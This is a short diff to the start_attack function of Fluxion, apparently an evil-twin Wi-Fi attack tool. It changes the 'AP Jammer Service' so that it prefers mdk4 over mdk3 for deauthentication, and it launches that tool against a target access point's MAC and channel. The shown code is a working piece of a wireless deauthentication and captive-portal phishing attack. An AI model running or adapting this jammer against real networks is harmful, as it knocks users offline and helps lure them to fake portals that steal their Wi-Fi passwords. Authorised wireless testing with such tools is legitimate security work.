@@ -1465,9 +1465,12 @@ start_attack() {
 
   echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
   echo -e "$FluxionTargetMAC" >"$FLUXIONWorkspacePath/mdk3_blacklist.lst"
+
+  if hash mdk4;then readonly DEAUTH="mdk4";else DEAUTH="mdk3";fi
+
   xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
     -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-    "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
+    "$DEAUTH $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &
   # Save parent's pid, to get to child later.
   CaptivePortalJammerServiceXtermPID=$!
 
